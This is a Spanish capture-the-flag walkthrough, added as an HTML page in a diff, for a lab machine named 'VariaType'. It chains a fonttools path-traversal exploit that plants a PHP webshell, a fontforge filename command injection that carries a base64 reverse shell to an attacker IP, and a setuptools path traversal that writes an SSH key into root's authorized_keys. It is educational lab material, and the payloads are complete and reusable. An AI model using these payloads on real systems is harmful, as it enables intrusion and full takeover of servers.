+                    <p>Con acceso autenticado en mano, volví a la funcionalidad de subida de fuentes del sitio principal. Usando <a href="https://github.com/advisories/GHSA-768j-98cg-p3fv">GHSA-768j-98cg-p3fv</a>, una vulnerabilidad de path traversal en la librería <code>fonttools varLib</code>, elaboré un archivo <code>.designspace</code> malicioso que escribió una webshell PHP directamente en el directorio público del portal. El payload de la webshell se inyectó abusando de secciones CDATA de XML en elementos <code>labelname</code>, que quedaron escritos literalmente en el archivo PHP resultante, dándome ejecución remota de código como <code>www-data</code>.</p>
+
+                    <p>Desde allí, monitorizando con <code>pspy64</code> observé que el usuario <code>steve</code> procesa periódicamente archivos de fuentes usando <code>fontforge</code> versión 20230101, que es vulnerable a inyección de comandos mediante el nombre de archivo (<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25081">CVE-2024-25081</a>). Como los nombres de archivo están restringidos a caracteres alfanuméricos, embebí una reverse shell codificada en base64 dentro de un archivo zip cuya entrada interna tenía el nombre de archivo malicioso. Un enfoque de zip slip provocó que <code>fontforge</code> procesara el nombre inyectado, disparando la inyección de comandos y dándome una shell como <code>steve</code>.</p>
+
+                    <p>Finalmente, <code>steve</code> tenía permisos <code>sudo</code> para ejecutar un script Python que usaba <code>PackageIndex().download()</code> de <code>setuptools</code> versión 78.1.0 para descargar una URL y guardarla en disco. Esta versión es vulnerable a <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47273">CVE-2025-47273</a>, un path traversal mediante slashes codificados en URL. Sirviendo mi clave pública SSH desde un servidor HTTP personalizado y pasando una URL con la ruta destino codificada en ella, escribí mi clave en <code>/root/.ssh/authorized_keys</code> como root, y me conecté por SSH para completar la máquina.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de <code>nmap</code> para identificar puertos abiertos y servicios en ejecución:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">PORT</span>   <span style="color:#e5c07b;">STATE</span>  <span style="color:#98c379;">SERVICE</span>  <span style="color:#61afef;">VERSION</span>
+<span style="color:#e06c75;">22</span>/tcp open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+<span style="color:#e06c75;">80</span>/tcp open  http     nginx 1.22.1
+|_http-title: Did not follow redirect to http://variatype.htb/</span></code></pre>
+
+                <p>Hay dos servicios expuestos: SSH en el puerto 22 y un servidor web nginx en el puerto 80 que redirige a <code>http://variatype.htb/</code>. Añado <code>variatype.htb</code> al <code>/etc/hosts</code> para resolverlo localmente.</p>
+
+                <h2>Enumeración Web</h2>
+                <p>Navegando a <code>http://variatype.htb/</code>, la página principal es en gran medida estática pero contiene una sección especialmente interesante: un formulario de subida que acepta archivos <code>.designspace</code> y fuentes (<code>.ttf</code>/<code>.otf</code>) para generar fuentes variables. La propia página describe el backend:</p>
+
+                <blockquote>
+                    <p>"Upload your .designspace file and master fonts (.ttf/.otf) to generate a fully compliant variable font. We use the same fonttools engine used by Google Fonts and major foundries."</p>
+                </blockquote>
+
+                <p>Esto confirma que el servidor ejecuta el motor <code>fonttools varLib</code>, que es exactamente el objetivo de un advisory conocido.</p>
+
+                <h3>Descubrimiento de Virtual Hosts</h3>
+                <p>Enumero virtual hosts con <code>ffuf</code> y encuentro un subdominio <code>portal</code> que devuelve respuesta 200:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">000000048</span>: 200   58 L   200 W   2488 Ch   <span style="color:#e5c07b;">"portal"</span></code></pre>
+
+                <p>Añado <code>portal.variatype.htb</code> al <code>/etc/hosts</code> y lo visito. A diferencia del sitio principal, este ejecuta PHP (se establece una cookie <code>PHPSESSID</code>), y presenta un formulario de login.</p>
+
+                <img src="./media/image1.png" alt="Página de login del portal interno de validación portal.variatype.htb mostrando formulario de usuario y contraseña" />
+
+                <pre><code class="language-plaintext"><span style="color:#61afef;">http://portal.variatype.htb</span> [200 OK] Cookies[PHPSESSID], Email[it-support@variatype.htb], Title[VariaType — Internal Validation Portal], nginx[1.22.1]</code></pre>
+
+                <h3>Comentario en Código Fuente — Filtración de Ruta en el Sistema de Archivos</h3>
+                <p>Mientras reviso el código fuente de ambos sitios, encuentro un comentario interesante dentro de un archivo CSS:</p>
+
+                <pre><code class="language-css"><span style="color:#7f848e;">/* /var/www/dev.variatype.htb/styles.css */</span>
+<span style="color:#e06c75;">:root</span> {</code></pre>
+
+                <p>Esto filtra la convención de nomenclatura usada para los directorios web bajo <code>/var/www/</code>, lo que resultará útil más adelante al apuntar rutas de escritura.</p>
+
+                <h3>Directorio .git Expuesto — Recuperación de Credenciales</h3>
+                <p>Fuzzeando directorios en <code>portal.variatype.htb</code> con <code>big.txt</code> encuentro un directorio <code>.git</code> expuesto:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">200</span> GET  http://portal.variatype.htb/.git/config
+<span style="color:#98c379;">200</span> GET  http://portal.variatype.htb/.git/description</code></pre>
+
+                <p>Uso <code>git-dumper</code> para descargar el repositorio completo. Revisando el historial de commits, encuentro credenciales hardcodeadas:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e5c07b;">gitbot</span>:<span style="color:#e06c75;">G1tB0t_Acc3ss_2025!</span></code></pre>
+
+                <p>No hay más código útil en el repositorio, pero estas credenciales son suficientes para acceder al portal.</p>
+
+                <h2>Acceso al Portal — Listado de Archivos Autenticado</h2>
+                <p>Usando las credenciales recuperadas para acceder a <code>portal.variatype.htb</code>, me lleva a un listado de archivos con los subidos previamente. El portal ofrece dos operaciones sobre cada archivo, mediante estos patrones de endpoints:</p>
+
+                <pre><code class="language-plaintext">http://portal.variatype.htb/view.php?f=variabype_zTTWD8Zioqk.ttf
+http://portal.variatype.htb/download.php?f=variabype_zTTWD8Zioqk.ttf</code></pre>
+
+                <p>Intento path traversal a través de ambos parámetros pero no encuentro bypass alguno. La superficie de ataque interesante sigue siendo la funcionalidad de subida de fuentes del sitio principal.</p>
+
+                <h2>Acceso Inicial — Escritura Arbitraria de Archivos en fonttools varLib (GHSA-768j-98cg-p3fv)</h2>
+                <p>El advisory en <a href="https://github.com/advisories/GHSA-768j-98cg-p3fv">GHSA-768j-98cg-p3fv</a> describe una vulnerabilidad de path traversal en <code>fonttools varLib</code>: el atributo <code>filename</code> del elemento <code>&lt;variable-font&gt;</code> en un archivo <code>.designspace</code> se usa tal cual al escribir la salida, sin saneamiento. Esto permite escribir el binario de fuente generado en una ruta arbitraria del sistema de archivos.</p>
+
+                <p>Conociendo la estructura del directorio web gracias al comentario CSS, elaboro un archivo <code>.designspace</code> que apunta a <code>/var/www/portal.variatype.htb/public/files/</code> como destino de escritura — un directorio que confirmo que es escribible ya que el portal sirve los archivos subidos desde ahí.</p>
+
+                <h3>Paso 1 — Escribir un archivo PHP esqueleto mediante path traversal</h3>
+                <p>Primero verifico que el primitivo de escritura funciona apuntando a una ruta de archivo PHP sencilla:</p>
+
+                <pre><code class="language-xml"><span style="color:#7f848e;">&lt;?xml version='1.0' encoding='UTF-8'?&gt;</span>
+<span style="color:#e06c75;">&lt;designspace</span> <span style="color:#e5c07b;">format=</span><span style="color:#98c379;">"5.0"</span><span style="color:#e06c75;">&gt;</span>
+  <span style="color:#e06c75;">&lt;axes&gt;</span>
+    <span style="color:#e06c75;">&lt;axis</span> <span style="color:#e5c07b;">tag=</span><span style="color:#98c379;">"wght"</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span> <span style="color:#e5c07b;">minimum=</span><span style="color:#98c379;">"100"</span> <span style="color:#e5c07b;">maximum=</span><span style="color:#98c379;">"900"</span> <span style="color:#e5c07b;">default=</span><span style="color:#98c379;">"400"</span><span style="color:#e06c75;">/&gt;</span>
+  <span style="color:#e06c75;">&lt;/axes&gt;</span>
+  <span style="color:#e06c75;">&lt;sources&gt;</span>
+    <span style="color:#e06c75;">&lt;source</span> <span style="color:#e5c07b;">filename=</span><span style="color:#98c379;">"source-light.ttf"</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Light"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;location&gt;&lt;dimension</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span> <span style="color:#e5c07b;">xvalue=</span><span style="color:#98c379;">"100"</span><span style="color:#e06c75;">/&gt;&lt;/location&gt;</span>
+    <span style="color:#e06c75;">&lt;/source&gt;</span>
+    <span style="color:#e06c75;">&lt;source</span> <span style="color:#e5c07b;">filename=</span><span style="color:#98c379;">"source-regular.ttf"</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Regular"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;location&gt;&lt;dimension</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span> <span style="color:#e5c07b;">xvalue=</span><span style="color:#98c379;">"400"</span><span style="color:#e06c75;">/&gt;&lt;/location&gt;</span>
+    <span style="color:#e06c75;">&lt;/source&gt;</span>
+  <span style="color:#e06c75;">&lt;/sources&gt;</span>
+
+  <span style="color:#7f848e;">&lt;!-- El atributo filename puede apuntar a cualquier ruta del sistema de archivos --&gt;</span>
+  <span style="color:#e06c75;">&lt;variable-fonts&gt;</span>
+    <span style="color:#e06c75;">&lt;variable-font</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"MaliciousFont"</span>
+      <span style="color:#e5c07b;">filename=</span><span style="color:#98c379;">"../../../../../../var/www/portal.variatype.htb/public/files/xd.php"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;axis-subsets&gt;&lt;axis-subset</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span><span style="color:#e06c75;">/&gt;&lt;/axis-subsets&gt;</span>
+    <span style="color:#e06c75;">&lt;/variable-font&gt;</span>
+  <span style="color:#e06c75;">&lt;/variable-fonts&gt;</span>
+<span style="color:#e06c75;">&lt;/designspace&gt;</span></code></pre>
+
+                <p>Tras subir este archivo junto con dos fuentes <code>.ttf</code> de relleno, navego a <code>http://portal.variatype.htb/public/files/xd.php</code> y confirmo que el archivo fue escrito — puedo ver los datos binarios de la fuente siendo servidos como salida PHP, lo que significa que el path traversal funcionó:</p>
+
+                <img src="./media/image4.png" alt="Respuesta del navegador mostrando datos binarios de fuente servidos desde xd.php, confirmando que la escritura arbitraria de archivos funcionó" />
+
+                <h3>Paso 2 — Inyectar una webshell PHP mediante CDATA XML</h3>
+                <p>El advisory también explica cómo inyectar código PHP arbitrario en el archivo de salida: el elemento <code>labelname</code> usa secciones CDATA que se escriben literalmente en la salida. Anidando secciones CDATA cuidadosamente, se puede embeber código PHP sin que el parser XML lo escape.</p>
+
+                <p>La técnica del advisory tiene esta pinta:</p>
+
+                <pre><code class="language-xml"><span style="color:#e06c75;">&lt;labelname</span> <span style="color:#e5c07b;">xml:lang=</span><span style="color:#98c379;">"en"</span><span style="color:#e06c75;">&gt;</span>&lt;![CDATA[&lt;?php echo shell_exec("/usr/bin/touch /tmp/MEOW123");?&gt;]]]]&gt;&lt;![CDATA[&gt;]]&gt;<span style="color:#e06c75;">&lt;/labelname&gt;</span></code></pre>
+
+                <p>Adaptándolo a una webshell funcional, mi payload completo y operativo es:</p>
+
+                <pre><code class="language-xml"><span style="color:#7f848e;">&lt;?xml version='1.0' encoding='UTF-8'?&gt;</span>
+<span style="color:#e06c75;">&lt;designspace</span> <span style="color:#e5c07b;">format=</span><span style="color:#98c379;">"5.0"</span><span style="color:#e06c75;">&gt;</span>
+  <span style="color:#e06c75;">&lt;axes&gt;</span>
+    <span style="color:#7f848e;">&lt;!-- La inyección XML ocurre en elementos labelname con secciones CDATA --&gt;</span>
+    <span style="color:#e06c75;">&lt;axis</span> <span style="color:#e5c07b;">tag=</span><span style="color:#98c379;">"wght"</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span> <span style="color:#e5c07b;">minimum=</span><span style="color:#98c379;">"100"</span> <span style="color:#e5c07b;">maximum=</span><span style="color:#98c379;">"900"</span> <span style="color:#e5c07b;">default=</span><span style="color:#98c379;">"400"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;labelname</span> <span style="color:#e5c07b;">xml:lang=</span><span style="color:#98c379;">"en"</span><span style="color:#e06c75;">&gt;</span>&lt;![CDATA[&lt;?php system($_GET['cmd']) ?&gt;]]]]&gt;&lt;![CDATA[&gt;]]&gt;<span style="color:#e06c75;">&lt;/labelname&gt;</span>
+      <span style="color:#e06c75;">&lt;labelname</span> <span style="color:#e5c07b;">xml:lang=</span><span style="color:#98c379;">"fr"</span><span style="color:#e06c75;">&gt;</span>MEOW2<span style="color:#e06c75;">&lt;/labelname&gt;</span>
+    <span style="color:#e06c75;">&lt;/axis&gt;</span>
+  <span style="color:#e06c75;">&lt;/axes&gt;</span>
+  <span style="color:#e06c75;">&lt;axis</span> <span style="color:#e5c07b;">tag=</span><span style="color:#98c379;">"wght"</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span> <span style="color:#e5c07b;">minimum=</span><span style="color:#98c379;">"100"</span> <span style="color:#e5c07b;">maximum=</span><span style="color:#98c379;">"900"</span> <span style="color:#e5c07b;">default=</span><span style="color:#98c379;">"400"</span><span style="color:#e06c75;">/&gt;</span>
+  <span style="color:#e06c75;">&lt;sources&gt;</span>
+    <span style="color:#e06c75;">&lt;source</span> <span style="color:#e5c07b;">filename=</span><span style="color:#98c379;">"source-light.ttf"</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Light"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;location&gt;&lt;dimension</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span> <span style="color:#e5c07b;">xvalue=</span><span style="color:#98c379;">"100"</span><span style="color:#e06c75;">/&gt;&lt;/location&gt;</span>
+    <span style="color:#e06c75;">&lt;/source&gt;</span>
+    <span style="color:#e06c75;">&lt;source</span> <span style="color:#e5c07b;">filename=</span><span style="color:#98c379;">"source-regular.ttf"</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Regular"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;location&gt;&lt;dimension</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span> <span style="color:#e5c07b;">xvalue=</span><span style="color:#98c379;">"400"</span><span style="color:#e06c75;">/&gt;&lt;/location&gt;</span>
+    <span style="color:#e06c75;">&lt;/source&gt;</span>
+  <span style="color:#e06c75;">&lt;/sources&gt;</span>
+  <span style="color:#e06c75;">&lt;variable-fonts&gt;</span>
+    <span style="color:#e06c75;">&lt;variable-font</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"MaliciousFont"</span>
+      <span style="color:#e5c07b;">filename=</span><span style="color:#98c379;">"../../../../../../var/www/portal.variatype.htb/public/files/xdd.php"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;axis-subsets&gt;&lt;axis-subset</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span><span style="color:#e06c75;">/&gt;&lt;/axis-subsets&gt;</span>
+    <span style="color:#e06c75;">&lt;/variable-font&gt;</span>
+  <span style="color:#e06c75;">&lt;/variable-fonts&gt;</span>
+  <span style="color:#e06c75;">&lt;instances&gt;</span>
+    <span style="color:#e06c75;">&lt;instance</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Display Thin"</span> <span style="color:#e5c07b;">familyname=</span><span style="color:#98c379;">"MyFont"</span> <span style="color:#e5c07b;">stylename=</span><span style="color:#98c379;">"Thin"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;location&gt;&lt;dimension</span> <span style="color:#e5c07b;">name=</span><span style="color:#98c379;">"Weight"</span> <span style="color:#e5c07b;">xvalue=</span><span style="color:#98c379;">"100"</span><span style="color:#e06c75;">/&gt;&lt;/location&gt;</span>
+      <span style="color:#e06c75;">&lt;labelname</span> <span style="color:#e5c07b;">xml:lang=</span><span style="color:#98c379;">"en"</span><span style="color:#e06c75;">&gt;</span>Display Thin<span style="color:#e06c75;">&lt;/labelname&gt;</span>
+    <span style="color:#e06c75;">&lt;/instance&gt;</span>
+  <span style="color:#e06c75;">&lt;/instances&gt;</span>
+<span style="color:#e06c75;">&lt;/designspace&gt;</span></code></pre>
+
+                <p>Tras subirlo, navego al archivo PHP escrito y añado <code>?cmd=id</code>, lo que confirma ejecución remota de código como <code>www-data</code>:</p>
+
+                <img src="./media/image3.png" alt="Navegador mostrando la webshell en xdd.php ejecutando el comando id, devolviendo uid=33(www-data)" />
+
+                <h2>Movimiento Lateral — Inyección de Comandos en fontforge (CVE-2024-25081)</h2>
+                <p>Ahora ejecutándome como <code>www-data</code>, subo <code>pspy64</code> y monitorizo la actividad de procesos. Cada dos minutos, el usuario <code>steve</code> (UID=1000) ejecuta un script de procesamiento de fuentes:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e5c07b;">UID=1000</span> | mkdir -p /home/steve/processed_fonts /home/steve/quarantine /home/steve/logs
+<span style="color:#e5c07b;">UID=1000</span> | /bin/bash /home/steve/bin/process_client_submissions.sh</code></pre>
+
+                <p>No puedo leer el script directamente desde el directorio home de <code>steve</code>, pero hay una copia en <code>/opt</code> que sí es legible. La sección crítica del script es:</p>
+
+                <pre><code class="language-bash"><span style="color:#c678dd;">if</span> timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c <span style="color:#98c379;">"
+import fontforge
+import sys
+try:
+    font = fontforge.open('</span><span style="color:#e06c75;">$file</span><span style="color:#98c379;">')
+    family = getattr(font, 'familyname', 'Unknown')
+..."</span></code></pre>
+
+                <p>La variable <code>$file</code> — que corresponde al nombre del archivo subido — se interpola directamente en un comando de shell sin saneamiento. Comprobando la versión instalada de <code>fontforge</code>:</p>
+
+                <pre><code class="language-bash">www-data@variatype:/opt$ /usr/local/src/fontforge/build/bin/fontforge --version
+<span style="color:#7f848e;">Version: 20230101</span></code></pre>
+
+                <p>La versión 20230101 es vulnerable a inyección de comandos mediante sustitución de comandos en el nombre de archivo (<code>$()</code>) tal como describe <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25081">CVE-2024-25081</a>. El shell expande las construcciones <code>$(...)</code> dentro del nombre de archivo antes de pasarlo a <code>fontforge</code>.</p>
+
+                <h3>Entendiendo la Restricción de Nombres de Archivo</h3>
+                <p>El script aplica una política de nomenclatura estricta antes de procesar cualquier archivo:</p>
+
+                <pre><code class="language-bash"><span style="color:#e5c07b;">SAFE_NAME_REGEX</span>=<span style="color:#98c379;">'^[a-zA-Z0-9._-]+$'</span>
+
+<span style="color:#c678dd;">if</span> [[ ! <span style="color:#98c379;">"$file"</span> =~ <span style="color:#e5c07b;">$SAFE_NAME_REGEX</span> ]]; <span style="color:#c678dd;">then</span>
+    log <span style="color:#98c379;">"QUARANTINE: Filename contains invalid characters: $file"</span>
+    mv <span style="color:#98c379;">"$file"</span> <span style="color:#98c379;">"$QUARANTINE_DIR/"</span> 2&gt;/dev/null || true
+    <span style="color:#c678dd;">continue</span>
+<span style="color:#c678dd;">fi</span></code></pre>
+
+                <p>Caracteres como <code>$</code>, <code>(</code>, <code>)</code>, espacios y <code>/</code> están todos bloqueados, lo que hace imposible una inyección directa mediante el nombre de archivo. Sin embargo, el script también procesa archivos comprimidos extrayéndolos primero:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e5c07b;">EXTENSIONS=</span>(
+  "*.ttf" "*.otf" "*.woff" "*.woff2"
+  "*.zip" "*.tar" "*.tar.gz"
+  "*.sfd"
+)</code></pre>
+
+                <p>Cuando se detecta un <code>.zip</code>, es el propio <code>fontforge</code> quien realiza la extracción, tal como confirma <code>pspy64</code>:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e5c07b;">UID=1000</span> | sh -c unzip -l /var/www/portal.variatype.htb/public/files/xd.zip &gt; /tmp/ffarchive-6673-1/ff-archive-table-of-contents</code></pre>
+
+                <p>El patrón de nomenclatura del directorio temporal (<code>ffarchive-</code>) confirma que es <code>fontforge</code> quien ejecuta <code>unzip</code>. Tras la extracción, <code>fontforge</code> intentará abrir el archivo extraído — y el nombre del archivo extraído está controlado por lo que hay almacenado dentro del zip, saltándose completamente la comprobación del regex sobre el nombre del zip exterior. Esto es una variante de zip slip.</p>
+
+                <h3>Elaboración del Payload</h3>
+                <p>Como el nombre de archivo inyectado debe contener caracteres como <code>$</code>, <code>(</code> y <code>)</code>, pero también un comando codificado en base64 (que puede contener <code>+</code> y <code>=</code> pero evita la mayoría de caracteres especiales), codifico la reverse shell en base64 y la envuelvo en un pipe con <code>bash -c</code>:</p>
+
+                <p>El payload en base64 se decodifica como:</p>
+                <pre><code class="language-bash"><span style="color:#61afef;">bash</span> -c <span style="color:#98c379;">"bash -i &gt;&amp; /dev/tcp/10.10.14.129/443 0&gt;&amp;1"</span></code></pre>
+
+                <p>El nombre de archivo malicioso dentro del zip es:</p>
+                <pre><code class="language-plaintext">$(echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjkvNDQzIDA+JjEiCg== | base64 -d | bash).ttf</code></pre>
+
+                <p>Creo un archivo zip llamado <code>xdd.zip</code> que contiene un archivo con este nombre, lo deposito en <code>/var/www/portal.variatype.htb/public/files/</code> a través de la webshell, y me pongo en escucha con netcat en el puerto 443.</p>
+
+                <p>En como mucho dos minutos, se dispara el cron. <code>pspy64</code> confirma la inyección:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e5c07b;">UID=1000</span> | sh -c ( cd /tmp/ffarchive-7123-1 ; unzip /var/www/portal.variatype.htb/public/files/xdd.zip $(echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjkvNDQzIDA+JjEiCg== | base64 -d | bash).ttf ) &gt; /dev/null</code></pre>
+
+                <p>Mi listener recibe una shell como <code>steve</code>. Como la shell es inestable y cae al cabo de poco tiempo, inmediatamente añado mi clave pública SSH a <code>/home/steve/.ssh/authorized_keys</code> para establecer persistencia antes de que se rompa, y luego me reconecto por SSH.</p>
+
+                <h2>Escalada de Privilegios — Escritura Arbitraria de Archivos en setuptools (CVE-2025-47273)</h2>
+                <p>Compruebo los privilegios sudo de <code>steve</code>:</p>
+
+                <pre><code class="language-bash">steve@variatype:~$ sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">User steve may run the following commands on variatype:
+    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *</code></pre>
+
+                <p>El script instala plugins de validación de fuentes descargando una URL proporcionada como argumento. Su mensaje de uso es:</p>
+
+                <pre><code class="language-plaintext">Usage: sudo /opt/font-tools/install_validator.py &lt;PLUGIN_URL&gt;
+Example: sudo /opt/font-tools/install_validator.py https://internal.example.com/plugins/glyph-check.py</code></pre>
+
+                <p>Las únicas comprobaciones de validación sobre la URL son:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">if not</span> is_valid_url(plugin_url):
+    <span style="color:#61afef;">print</span>(<span style="color:#98c379;">"[-] Invalid URL. Must start with http:// or https://"</span>)
+    sys.exit(<span style="color:#e5c07b;">1</span>)
+
+<span style="color:#c678dd;">if</span> plugin_url.count(<span style="color:#98c379;">'/'</span>) &gt; <span style="color:#e5c07b;">10</span>:
+    <span style="color:#61afef;">print</span>(<span style="color:#98c379;">"[-] Suspiciously long URL. Aborting."</span>)
+    sys.exit(<span style="color:#e5c07b;">1</span>)</code></pre>
+
+                <p>El límite de slashes es digno de mención — si un exploit necesitara más de 10 slashes en la URL, teóricamente se podría usar un proxy de redirección para llegar a la URL final maliciosa, aunque no será necesario aquí.</p>
+
+                <p>La descarga en sí la gestiona <code>PackageIndex()</code> de <code>setuptools</code>:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">def</span> <span style="color:#61afef;">install_validator_plugin</span>(plugin_url):
+    <span style="color:#c678dd;">if not</span> os.path.exists(PLUGIN_DIR):
+        os.makedirs(PLUGIN_DIR, mode=<span style="color:#e5c07b;">0o755</span>)
+    logging.info(<span style="color:#e5c07b;">f</span><span style="color:#98c379;">"Attempting to install plugin from: {plugin_url}"</span>)
+    index = <span style="color:#61afef;">PackageIndex</span>()
+    <span style="color:#c678dd;">try</span>:
+        downloaded_path = index.download(plugin_url, PLUGIN_DIR)
+        logging.info(<span style="color:#e5c07b;">f</span><span style="color:#98c379;">"Plugin installed at: {downloaded_path}"</span>)
+        <span style="color:#61afef;">print</span>(<span style="color:#98c379;">"[+] Plugin installed successfully."</span>)</code></pre>
+
+                <p>Comprobando la versión instalada de <code>setuptools</code>:</p>
+
+                <pre><code class="language-bash">steve@variatype:/opt/font-tools$ pip show setuptools
+<span style="color:#7f848e;">Name: setuptools
+Version: 78.1.0</span></code></pre>
+
+                <p>La versión 78.1.0 es vulnerable a <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47273">CVE-2025-47273</a>: el método <code>PackageIndex().download()</code> usa la ruta de la URL como nombre de archivo de destino sin decodificar y sanear correctamente los separadores de ruta codificados en porcentaje. Al codificar <code>/</code> como <code>%2F</code> en la parte de la ruta de la URL, el archivo final se escribe en la ruta decodificada — es decir, en una ubicación arbitraria del sistema de archivos. Referencias: <a href="https://security.snyk.io/vuln/SNYK-PYTHON-SETUPTOOLS-9964606">SNYK-PYTHON-SETUPTOOLS-9964606</a>.</p>
+
+                <h3>Verificación de la Prueba de Concepto</h3>
+                <p>Antes de apuntar al directorio SSH de <code>root</code>, confirmo que el primitivo funciona. Arranco un servidor HTTP personalizado de Python que devuelve un cuerpo de respuesta fijo independientemente de la ruta solicitada:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">from</span> http.server <span style="color:#c678dd;">import</span> HTTPServer, BaseHTTPRequestHandler
+
+<span style="color:#c678dd;">class</span> <span style="color:#e5c07b;">CatchAllHandler</span>(BaseHTTPRequestHandler):
+    <span style="color:#c678dd;">def</span> <span style="color:#61afef;">do_GET</span>(self):
+        self.send_response(<span style="color:#e5c07b;">200</span>)
+        self.send_header(<span style="color:#98c379;">"Content-type"</span>, <span style="color:#98c379;">"text/plain"</span>)
+        self.end_headers()
+        response_text = <span style="color:#98c379;">"mypayload"</span>
+        self.wfile.write(response_text.encode(<span style="color:#98c379;">"utf-8"</span>))
+
+<span style="color:#c678dd;">def</span> <span style="color:#61afef;">run</span>(port=<span style="color:#e5c07b;">80</span>):
+    server_address = (<span style="color:#98c379;">''</span>, port)
+    httpd = HTTPServer(server_address, CatchAllHandler)
+    <span style="color:#61afef;">print</span>(<span style="color:#e5c07b;">f</span><span style="color:#98c379;">"Starting server on port {port}..."</span>)
+    <span style="color:#c678dd;">try</span>:
+        httpd.serve_forever()
+    <span style="color:#c678dd;">except</span> KeyboardInterrupt:
+        <span style="color:#61afef;">print</span>(<span style="color:#98c379;">"\nStopping server."</span>)
+        httpd.server_close()
+
+<span style="color:#c678dd;">if</span> __name__ == <span style="color:#98c379;">"__main__"</span>:
+    run()</code></pre>
+
+                <p>Llamo al script sudo con una URL apuntando a mi servidor, con la ruta destino codificada en URL en la ruta de la URL:</p>
+
+                <pre><code class="language-bash">steve@variatype:~$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
+    http://10.10.14.129/<span style="color:#e06c75;">%2Ftmp%2Fpwned</span>
+
+<span style="color:#7f848e;">[INFO] Attempting to install plugin from: http://10.10.14.129/%2Ftmp%2Fpwned
+[INFO] Downloading http://10.10.14.129/%2Ftmp%2Fpwned
+[INFO] Plugin installed at: /tmp/pwned</span>
+[+] Plugin installed successfully.</code></pre>
+
+                <p>El archivo es propiedad de root y contiene exactamente mi payload servido:</p>
+
+                <pre><code class="language-bash">-rw-r--r-- 1 root root 9 /tmp/pwned
+steve@variatype:~$ cat /tmp/pwned
+mypayload</code></pre>
+
+                <p>El primitivo queda confirmado: lo que devuelva el servidor HTTP se escribe en la ruta decodificada, como root.</p>
+
+                <h3>Escritura de Clave SSH Autorizada como Root</h3>
+                <p>Actualizo el servidor para que sirva mi clave pública SSH en su lugar:</p>
+
+                <pre><code class="language-python">response_text = <span style="color:#98c379;">"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILnsFLLgBuhGAkDdmNK86OBVaDN8Aqyy+l6EpQuz8uBJ asd@asd.com"</span></code></pre>
+
+                <p>Y lo reinicio. A continuación ejecuto el script sudo apuntando a <code>/root/.ssh/authorized_keys</code>:</p>
+
+                <pre><code class="language-bash">steve@variatype:~$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
+    http://10.10.14.129/<span style="color:#e06c75;">%2Froot%2F.ssh%2Fauthorized_keys</span>
+
+<span style="color:#7f848e;">[INFO] Attempting to install plugin from: http://10.10.14.129/%2Froot%2F.ssh%2Fauthorized_keys
+[INFO] Downloading http://10.10.14.129/%2Froot%2F.ssh%2Fauthorized_keys
+[INFO] Plugin installed at: /root/.ssh/authorized_keys</span>
+[+] Plugin installed successfully.</code></pre>
+
+                <p>Mi clave pública ya está escrita en el <code>authorized_keys</code> de root. Me conecto por SSH con la clave privada correspondiente:</p>
+
+                <pre><code class="language-bash">ssh -i ~/.ssh/kerssh root@variatype.htb</code></pre>
+
+                <pre><code class="language-plaintext">Linux variatype 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 x86_64
+
+root@variatype:~# id
+<span style="color:#98c379;">uid=0(root) gid=0(root) groups=0(root)</span></code></pre>
+
+                <p>Acceso root obtenido. Máquina completada.</p>
+
+            </div>
+        </article>
+    </main>
+
+    <script src="../../index.js"></script>
+</body>
+
+</html>
